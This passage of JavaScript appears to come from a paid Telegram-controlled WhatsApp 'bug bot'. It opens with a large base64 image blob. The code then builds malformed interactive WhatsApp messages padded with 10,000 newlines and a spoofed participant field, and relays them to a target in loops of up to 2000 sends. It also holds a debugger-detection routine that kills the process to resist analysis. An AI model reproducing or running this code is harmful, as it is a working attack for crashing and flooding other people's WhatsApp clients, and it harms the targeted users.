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",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "caywzz"
                },
                footer: {
                  text: "cay.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ caywzz.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await cay.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function caywzztes(target) {
  for (let i = 0; i < 20; i++) {
    await VanitasFC(target);
  }
} 
async function MatrixOverLoad1(target) {
  for (let i = 0; i < 2000; i++) {
    await InvisCarousel(target);
    await delay(1000); // Delay 1 detik
  }
} 
async function delaymakeroverload1(target) {
  for (let i = 0; i < 2000; i++) {
      await InvisCarousel(target);
    await delay(1000); // Delay 1 detik
  }
} 
            bot.launch().then(() => {
  const systemInfo = getSystemInfo();
  sendMessageToMe('Bot sudah terhubung dan mengirim pesan ke Anda!\n' + systemInfo);
});
setInterval(() => {
    const now = Date.now();
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    Object.keys(botSessions).forEach(botToken => {
        if (botSessions[botToken].expiresAt < now) {
            delete botSessions[botToken];
        }
    });
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));
}, 60 * 60 * 1000); // Check every hour

function detectDebugger() {
  const start = Date.now();
  debugger;
  if (Date.now() - start > 100) {
    console.error("Debugger detected! Exiting...");
    process.exit(1);
  }
}

setInterval(detectDebugger, 5000);
const os = require('os');

// BOT WHATSAPP
